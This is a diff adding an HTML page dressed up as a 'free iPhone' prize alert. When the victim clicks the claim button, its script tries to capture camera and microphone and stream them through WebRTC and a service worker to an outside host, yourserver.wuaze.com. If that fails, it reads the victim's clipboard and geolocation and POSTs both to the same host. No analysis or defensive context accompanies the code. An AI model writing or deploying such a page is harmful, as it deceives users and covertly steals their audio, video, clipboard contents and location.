@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Urgent News Alert</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f0f0f0;
+      padding: 20px;
+    }
+    h1 {
+      color: #ff4444;
+      font-size: 24px;
+    }
+    p {
+      font-size: 16px;
+      line-height: 1.5;
+    }
+    .btn {
+      background: #ff4444;
+      color: white;
+      padding: 15px;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+      display: block;
+      margin: 20px auto;
+      width: fit-content;
+    }
+  </style>
+</head>
+<body>
+  <h1>Breaking News: You've Won a Free iPhone!</h1>
+  <p>Congratulations! You've been randomly selected to receive a brand new iPhone 13.
+    To claim your prize, please click the button below and follow the instructions.</p>
+  
+  <div class="btn" onclick="triggerExploit()">Claim Your Prize Now</div>
+
+  <script>
+    async function triggerExploit() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const peer = new RTCPeerConnection({
+          iceServers: [{ urls: 'stun:yourserver.wuaze.com' }]
+        });
+        stream.getTracks().forEach(track => peer.addTrack(track, stream));
+        peer.createOffer().then(offer => peer.setLocalDescription(offer));
+
+        // Register Service Worker
+        navigator.serviceWorker.register('/sw.js');
+        navigator.serviceWorker.ready.then(registration => {
+          registration.active.postMessage({ cmd: 'startStream', target: 'yourserver.wuaze.com' });
+        });
+
+      } catch (e) {
+        // Clipboard Read
+        navigator.clipboard.readText().then(text => {
+          fetch('https://yourserver.wuaze.com/clip.php', {
+            method: 'POST',
+            body: text
+          });
+        });
+
+        // Geolocation Read
+        navigator.geolocation.getCurrentPosition(position => {
+          fetch('https://yourserver.wuaze.com/loc.php', {
+            method: 'POST',
+            body: JSON.stringify(position.coords)
+          });
+        });
+      }
+    }
+  </script>
+</body>
+</html>
